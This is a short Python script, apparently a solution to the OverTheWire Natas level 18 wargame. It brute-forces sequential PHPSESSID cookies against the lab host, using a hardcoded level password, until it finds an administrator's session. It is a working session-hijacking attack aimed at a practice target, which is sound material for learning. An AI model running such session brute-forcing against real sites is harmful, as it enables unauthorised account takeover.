import requests

url = "http://natas18.natas.labs.overthewire.org/"
auth_username = "natas18"
auth_password = "xvKIqDjy4OPv7wCRgDlmj0pFsCsDjhdP"
user_str = "You are logged in as a regular user."

for i in range(1,641):
    cookies = dict(PHPSESSID=str(i))
    r = requests.get(url, auth=(auth_username, auth_password), cookies=cookies)
    if user_str in r.text:
        print ("Attempt ", i, " is not admin!")
    else:
        print ("Attempt ", i, " IS ADMIN!")
        print (r.content)
        break
